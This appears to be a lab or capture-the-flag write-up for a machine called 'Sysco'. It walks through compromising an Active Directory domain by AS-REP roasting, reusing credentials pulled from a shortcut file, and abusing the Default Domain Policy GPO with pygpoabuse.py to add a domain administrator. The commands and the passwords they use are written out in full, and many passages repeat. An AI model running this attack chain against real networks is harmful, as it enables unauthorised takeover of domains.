Sysco

Sysco

Objectives

The core objective of this external penetration test is to simulate a realistic, determined adversary to achieve Domain Administrator privileges within Sysco's Active Directory (AD) environment. Starting from an external position, we will focus on obtaining an initial foothold, performing lateral movement, and executing privilege escalation while successfully evading Antivirus (AV) and other security controls. This is a red-team exercise to find security weaknesses before a real attacker does.
The core objective of this external penetration test is to simulate a realistic, determined adversary to achieve Domain Administrator privileges within Sysco's Active Directory (AD) environment. Starting from an external position, we will focus on obtaining an initial foothold, performing lateral movement, and executing privilege escalation while successfully evading Antivirus (AV) and other security controls. This is a red-team exercise to find security weaknesses before a real attacker does.

No credentials have been provided for this assessment. Running NetExec against the IP shows it is a domain controller with the domain name as sysco.local:

┌──(kali㉿kali)-[~/Desktop/Labs/Sysco]
└─$ nxc smb 10.1.62.164                                 
SMB         10.1.62.164     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
┌──(kali㉿kali)-[~/Desktop/Labs/Sysco]
└─$ nxc smb 10.1.62.164                                 
SMB         10.1.62.164     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)

However, it is not possible to enumerate the domain using guest or null authentication.

└─$ ./username-anarchy --input-file names.txt > usernames.txt

And using impacket-GetNPUsers, I attempted to identify the valid usernames through AS-REP Roasting and got a hit on jack.dowland:

I saved the AS-REP hash to a file called hash.txt on my machine. As shown in the output above, the valid usernames are the following:

jack.dowland
greg.shields
lainey.moore
jack.dowland
greg.shields
lainey.moore

Now I have a valid set of domain credentials which I can use to enumerate the domain:

┌──(kali㉿kali)-[~/Desktop/Labs/Sysco]

When checking for group membership, I notice this new user belongs to multiple groups in the domain:

However, I am interested in the Remote Desktop Users and Remote Management Users the most as WinRM is not open on the machine, but RDP is.

Using xfreerdp3, I gained RDP access on the machine:

I used the following command:

xfreerdp3 /u:lainey.moore /p:Chocolate1 /v:sysco.local /drive:.,linux /dynamic-resolution
xfreerdp3 /u:lainey.moore /p:Chocolate1 /v:sysco.local /drive:.,linux /dynamic-resolution

The user.txt flag content:

When checking for interesting files on the machine, I came across a notes file:

As shown in the image above, the notes file contains the following message:

-Ssh to the 10.0.0.1 router with credentials provided by sysadmin to update ACLs for HS company
-Fix errors in config provided by tier 1 for Minicorp's new office router
-Ssh to the 10.0.0.1 router with credentials provided by sysadmin to update ACLs for HS company
-Fix errors in config provided by tier 1 for Minicorp's new office router

However, double-clicking on the startup does not do anything and it leads to timeout:

Since this is a .lnk file. I can reverse engineer it. Maybe that way I can obtain the credentials inside it?

Using an online decoder, I managed to extract the string data from the .lnk file to obtain the credentials:

As shown in the image above, the command used is the following:

-ssh netadmin@10.0.0.1 -pw 5y5coSmarter2025!!!
-ssh netadmin@10.0.0.1 -pw 5y5coSmarter2025!!!

I discovered one more user in the domain by the name of greg.shields. When reusing this password against this new user, I get a hit:

And checking what privileges this user has shows it can modify the Default Domain Policy GPO:

Since this is the default GPO and our user has GenericAll privileges, we can edit it to add a new user, perform command execution, etc. I grabbed the GPO ID first:

Then using gpoabuse.py, I made changes to the Default Domain Policy GPO successfully to add a new domain administrator user:

┌──(kali㉿kali)-[~/Desktop/Labs/Sysco/pyGPOAbuse]
└─$ # Add Domain user and add to Domain Admins via Domain-Controller
python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname SecurityUpdate  -dc-ip 10.1.62.164 -command 'net user UserGPO P@ssw0rd /add && net group "Domain Admins" UserGPO /add' -filter-enabled -target-dns-name dc01.sysco.local
[+] ScheduledTask SecurityUpdate created!
┌──(kali㉿kali)-[~/Desktop/Labs/Sysco/pyGPOAbuse]
└─$ # Add Domain user and add to Domain Admins via Domain-Controller
python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname SecurityUpdate  -dc-ip 10.1.62.164 -command 'net user UserGPO P@ssw0rd /add && net group "Domain Admins" UserGPO /add' -filter-enabled -target-dns-name dc01.sysco.local
[+] ScheduledTask SecurityUpdate created!
